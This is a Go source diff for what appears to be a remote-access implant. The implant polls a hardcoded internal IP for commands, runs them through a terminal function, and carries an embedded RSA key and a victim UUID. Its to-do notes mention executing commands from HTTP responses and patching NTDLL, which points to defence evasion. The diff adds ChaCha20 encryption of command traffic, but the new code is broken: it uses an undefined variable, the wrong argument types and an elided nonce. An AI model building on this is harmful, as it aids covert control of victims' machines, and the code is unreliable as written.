@@ -21,15 +21,33 @@ import (
 	"golang.org/x/crypto/chacha20poly1305"
 )
 
-func chacha(pass string, msg string) (enc_block []byte) {
-
-	key := sha256.Sum256([]byte(pass))
-	aead, _ := chacha20poly1305.NewX(key[:])
-
+func encryptMessage(key, plaintext []byte) ([]byte, []byte, error) {
 	nonce := make([]byte, chacha20poly1305.NonceSizeX)
-	enc_block = aead.Seal(nil, nonce, []byte(msg), nil)
-	return
+	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
+		return nil, nil, err
+	}
 
+	cipher, err := chacha20poly1305.NewX(key)
+	if err != nil {
+		return nil, nil, err
+	}
+
+	ciphertext := cipher.Seal(nil, nonce, plaintext, nil)
+	return ciphertext, nonce, nil
+}
+
+func decryptMessage(key, ciphertext, nonce []byte) ([]byte, error) {
+	cipher, err := chacha20poly1305.NewX(key)
+	if err != nil {
+		return nil, err
+	}
+
+	plaintext, err := cipher.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	return plaintext, nil
 }
 
 func terminal(command string) (res string) {
@@ -82,6 +100,8 @@ func getCurrentUser() (name string) {
 }
 
 func main() {
+	nonce := []byte{...}
+	const key =	"12345678901234567890123456789012"	
 	const pubKeyPEM = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4pz/Qsw7oDtdwT857JcsGU4KWHFi+OgnFbK02BwF82mlESwn9znXldI9guEYW476XvgfMTNP0reGxle+BmIn+AujJ/QF7gQtZ2W/QCZPaOK2sbphRNfaY4zlb8qLrCvsZ4K5SGpyY7U/skyF1lPIW1Og6N+HY8+eSG9xzzGl/SfAjaIhyBT1g94jFtZty9NYXNevdLwdU8OhU1/IzmQU2jG225vZgF0lvbkrVgTLV+iVKqQt1NsLqh141II6UEqZuEHvKtuclbJLTxKSF2uNBCPILDhv8zIqq0K6368hQ8P7FAPoQK96pjx4UwviMG+RSZfa/T7h5tKJNM3cVz3NTwIDAQAB\n-----END PUBLIC KEY-----"
 	PEMBlock, _ := pem.Decode([]byte(pubKeyPEM))
 	if PEMBlock == nil {
@@ -93,10 +113,8 @@ func main() {
 	pubkey, _ := x509.ParsePKIXPublicKey(PEMBlock.Bytes)
 
 	// to do
-	// generate random uuid of numbers/letters [all done]
-	// add a user agent with http.requests [all done]
-	// execute out from http request [all done]
-	// Patch NTDLL
+	// set the pubkey to be generated through the builder app, same with uuid
+
 	uuidWithHyphen := uuid.New()
 	uuid := strings.Replace(uuidWithHyphen.String(), "-", "", -1)
 	// Construct the client for requests, we define nothing right now but in the future can add functionality
@@ -133,7 +151,11 @@ func main() {
 		}
 
 		//Convert the body to type string
-		sb := string(body)
+		esb := string(body)
+		// we need to decrypt the body now
+
+		sb,_ := decryptMessage(Key, esb, nonce)
+
 		for sb == "0" {
 			time.Sleep(2 * time.Second)
 			req, err = http.NewRequest("GET", "http://192.168.1.179:8000/session", nil)
